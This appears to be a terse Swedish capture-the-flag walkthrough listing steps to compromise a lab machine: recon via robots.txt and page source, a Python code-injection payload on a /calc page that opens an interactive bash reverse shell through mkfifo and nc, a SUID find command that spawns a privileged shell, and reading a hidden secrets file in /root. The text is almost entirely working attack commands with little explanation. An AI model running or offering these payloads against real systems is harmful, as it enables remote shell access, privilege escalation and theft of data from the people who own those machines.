1. surfa till ip:n, kolla robots.txt, läs src eller ta bord div:en
2. gå till /calc...
3. Gör ngt i stil med:
  __import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc localhost 60264 >/tmp/f')
4. cd ~ && ls -Ral
5. gå till den gömda mappen
6. ./find . -exec /bin/sh -p \; -quit
7. cd /root && ls -al
8. cat .hidden_secrets.txt
